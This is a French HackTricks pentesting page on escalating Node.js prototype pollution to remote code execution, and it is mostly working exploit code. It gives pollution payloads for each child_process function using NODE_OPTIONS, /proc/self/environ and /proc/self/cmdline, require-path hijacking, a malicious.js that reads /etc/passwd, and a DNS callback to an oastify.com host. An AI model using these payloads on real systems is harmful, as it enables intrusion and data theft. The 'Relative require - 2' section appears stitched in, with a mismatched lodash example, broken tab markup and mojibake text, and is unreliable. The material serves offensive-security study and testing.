# Pollution de prototype vers RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Code vuln√©rable

Imaginez un vrai JS utilisant un code comme celui-ci :
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
    console.log(typeof obj);
    return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

function clone(target) {
    return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE via les variables d'environnement

**PP2RCE** signifie **Prototype Pollution to RCE** (Ex√©cution de code √† distance).

Selon ce [**writeup**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), lorsqu'un **processus est lanc√©** avec une m√©thode de **`child_process`** (comme `fork` ou `spawn` ou autres), il appelle la m√©thode `normalizeSpawnArguments` qui est un **gadget de pollution de prototype pour cr√©er de nouvelles variables d'environnement** :
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
  ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
  const value = env[key];
  if (value !== undefined) {
    ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
  }
}
```
V√©rifiez ce code, vous pouvez voir qu'il est possible d'**empoisonner `envPairs`** simplement en **polluant** l'**attribut `.env`.**

### **Empoisonnement de `__proto__`**

{% hint style="warning" %}
Notez que, en raison de la fa√ßon dont fonctionne la fonction **`normalizeSpawnArguments`** de la biblioth√®que **`child_process`** de node, lorsqu'on appelle quelque chose pour **d√©finir une nouvelle variable d'environnement** pour le processus, il suffit de **polluer n'importe quoi**.\
Par exemple, si vous faites `__proto__.avar="valuevar"`, le processus sera lanc√© avec une variable appel√©e `avar` avec la valeur `valuevar`.

Cependant, pour que la **variable d'environnement soit la premi√®re**, vous devez **polluer** l'**attribut `.env`** et (uniquement dans certaines m√©thodes) cette variable sera la **premi√®re** (permettant l'attaque).

C'est pourquoi **`NODE_OPTIONS`** n'est **pas dans `.env`** dans l'attaque suivante.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### Empoisonnement de `constructor.prototype`
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE via variables d'environnement + ligne de commande

Une charge utile similaire √† la pr√©c√©dente avec quelques modifications a √©t√© propos√©e dans [**ce rapport**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** Les principales diff√©rences sont :

* Au lieu de stocker la **charge utile** nodejs √† l'int√©rieur du fichier `/proc/self/environ`, elle est stock√©e √† l'int√©rieur de **argv0** de **`/proc/self/cmdline`**.
* Ensuite, au lieu de requ√©rir via **`NODE_OPTIONS`** le fichier `/proc/self/environ`, il **requiert `/proc/self/cmdline`**.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## Interaction DNS

En utilisant les charges utiles suivantes, il est possible d'exploiter la variable d'environnement NODE_OPTIONS que nous avons pr√©c√©demment discut√©e et de d√©tecter si elle a fonctionn√© avec une interaction DNS:
```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id.oastify.com"
  }
}
```
Ou, pour √©viter les pare-feux applicatifs web qui demandent le domaine :
```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
  }
}
```
## Vuln√©rabilit√© PP2RCE des fonctions child\_process

Dans cette section, nous allons analyser **chaque fonction de `child_process`** pour ex√©cuter du code et voir si nous pouvons utiliser une technique pour forcer cette fonction √† ex√©cuter du code :

<details>

<summary>Exploitation de <code>exec</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
</details>

<details>

<summary><strong>Exploitation de <code>execFile</code></strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
Pour que **`execFile`** fonctionne, il **DOIT ex√©cuter node** pour que les NODE\_OPTIONS fonctionnent.\
Si ce n'est pas **node** qui est ex√©cut√©, vous devez trouver comment vous pouvez **modifier l'ex√©cution** de ce qui est ex√©cut√© **avec des variables d'environnement** et les d√©finir.

Les **autres** techniques **fonctionnent** sans cette exigence car il est **possible de modifier** **ce qui est ex√©cut√©** via la pollution de prototype. (Dans ce cas, m√™me si vous pouvez polluer `.shell`, vous ne polluerez pas ce qui est en train d'√™tre ex√©cut√©).

</details>

<details>

<summary>Exploitation de <code>fork</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong>Exploitation de <code>spawn</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong>Exploitation de <code>execFileSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Exploitation de <code>execSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Exploitation de <code>spawnSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## Forcer Spawn

Dans les exemples pr√©c√©dents, vous avez vu comment d√©clencher la fonctionnalit√© d'un gadget qui appelle `spawn` en ayant besoin (toutes les m√©thodes de `child_process` utilis√©es pour ex√©cuter quelque chose l'appellent). Dans l'exemple pr√©c√©dent, cela faisait partie du code, mais que se passe-t-il si le code ne l'appelle pas.

### Contr√¥le d'un chemin de fichier requis

Dans cet [**autre article**](https://blog.sonarsource.com/blitzjs-prototype-pollution/), l'utilisateur peut contr√¥ler le chemin du fichier o√π un `require` sera ex√©cut√©. Dans ce sc√©nario, l'attaquant doit simplement trouver un fichier `.js` √† l'int√©rieur du syst√®me qui ex√©cutera une m√©thode spawn lorsqu'il est import√©.\
Voici quelques exemples de fichiers courants appelant une fonction spawn lorsqu'ils sont import√©s :

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* Trouvez **plus de fichiers ci-dessous**

Le script simple suivant recherchera les appels de **child\_process** **sans aucun rembourrage** (pour √©viter de montrer des appels √† l'int√©rieur de fonctions) :
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
    grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>Fichiers int√©ressants trouv√©s par le script pr√©c√©dent</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### D√©finition du chemin de fichier requis via la pollution de prototype

{% hint style="warning" %}
La **technique pr√©c√©dente n√©cessite** que l'**utilisateur contr√¥le le chemin du fichier** qui va √™tre **requis**. Mais ce n'est pas toujours vrai.
{% endhint %}

Cependant, si le code va ex√©cuter un require apr√®s la pollution de prototype, m√™me si vous **ne contr√¥lez pas le chemin** qui va √™tre requis, vous **pouvez forcer un autre chemin en abusant de la pollution de prototype**. Ainsi, m√™me si la ligne de code est comme `require("./a_file.js")` ou `require("bytes")`, elle **requerra le package que vous avez pollu√©**.

Par cons√©quent, si un require est ex√©cut√© apr√®s votre pollution de prototype et qu'il n'y a pas de fonction spawn, voici l'attaque :

* Trouvez un **fichier `.js` dans le syst√®me** qui, lorsqu'il est **requis**, va **ex√©cuter quelque chose en utilisant `child_process`**
  * Si vous pouvez t√©l√©charger des fichiers sur la plateforme que vous attaquez, vous pouvez t√©l√©charger un fichier comme celui-ci
* Polluez les chemins pour **forcer le chargement du fichier `.js`** qui ex√©cutera quelque chose avec child\_process
* **Polluez l'environnement/cmdline** pour ex√©cuter du code arbitraire lorsqu'une fonction d'ex√©cution de child\_process est appel√©e (voir les techniques initiales)

#### Require absolu

Si le require effectu√© est **absolu** (`require("bytes")`) et que le **package ne contient pas de main** dans le fichier `package.json`, vous pouvez **polluer l'attribut `main`** et faire en sorte que le **require ex√©cute un fichier diff√©rent**.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

Nous avons maintenant une injection de commande √† distance (RCE) sur le serveur.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
#### Relative require - 1

Si un **chemin relatif** est charg√© au lieu d'un chemin absolu, vous pouvez faire en sorte que node **charge un chemin diff√©rent**:

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

Nous avons maintenant une injection de commande √† distance (RCE) sur le serveur.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Relative require - 2

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// poc.js
const vm = require('vm');
const { readFileSync } = require('fs');
const { join } = require('path');

const payload = `
const { exec } = require('child_process');
exec('touch /tmp/hacked');
`;

const sandbox = {
    require: (module) => {
        if (module === 'lodash') {
            const lodash = require(module);
            lodash.mixin({
                'templateSettings': {
                    'evaluate': /<%([\s\S]+?)%>/g,
                    'interpolate': /<%=([\s\S]+?)%>/g,
                    'escape': /<%-([\s\S]+?)%>/g
                }
            });
            return lodash;
        }
        return require(module);
    }
};

const filename = join(process.cwd(), 'node_modules', 'lodash', 'template.js');
const fileContent = readFileSync(filename, 'utf-8');

vm.runInNewContext(fileContent, sandbox, { filename });

const template = '<%= console.log(process.mainModule.require("child_process").execSync("touch /tmp/hacked")) %>';
const compiled = sandbox._.template(template);
compiled();
```
{% endcode %}
{% endtab %}

{% tab title="description" %}
This exploit is a variation of the previous one. It abuses the `lodash` library to achieve prototype pollution. The difference is that this time the `lodash` library is required relatively, so it is not necessary to have it installed in the project's dependencies.

The exploit works by first loading the `lodash` library and then modifying its `templateSettings` object to allow code execution. Then, it creates a template string that executes arbitrary code and compiles it using the modified `lodash` library. Finally, the compiled template is executed, resulting in code execution.

This exploit can be used to achieve remote code execution in Node.js applications that use a vulnerable version of the `lodash` library and allow the loading of modules using relative paths.
{% endtab %}
{% endtabs %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

Nous avons maintenant une RCE sur le serveur.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
## Gadgets VM

Dans l'article [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf), il est √©galement indiqu√© que le contr√¥le de **`contextExtensions`** √† partir de certaines m√©thodes de la biblioth√®que **`vm`** pourrait √™tre utilis√© comme gadget.\
Cependant, comme les m√©thodes pr√©c√©dentes de **`child_process`**, cela a √©t√© **corrig√©** dans les derni√®res versions.

## Corrections et protections inattendues

Veuillez noter que la pollution de prototype fonctionne si l'**attribut** d'un objet qui est en cours d'acc√®s est **ind√©fini**. Si dans le **code** cet **attribut** est **d√©fini** avec une **valeur**, vous ne pourrez pas l'√©craser.

En juin 2022, √† partir de [**ce commit**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a), la variable `options` au lieu de `{}` est un **`kEmptyObject`**. Ce qui **emp√™che la pollution de prototype** d'affecter les **attributs** de **`options`** pour obtenir RCE.\
Au moins depuis la version 18.4.0, cette protection a √©t√© **impl√©ment√©e**, et donc les **exploits** `spawn` et `spawnSync` affectant les m√©thodes **ne fonctionnent plus** (si aucune `option` n'est utilis√©e !).

Dans [**ce commit**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9), la **pollution de prototype** de **`contextExtensions`** de la biblioth√®que vm a √©galement √©t√© **corrig√©e** en d√©finissant les options sur \*\*`kEmptyObject` \*\* au lieu de **`{}`.**

## R√©f√©rences

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
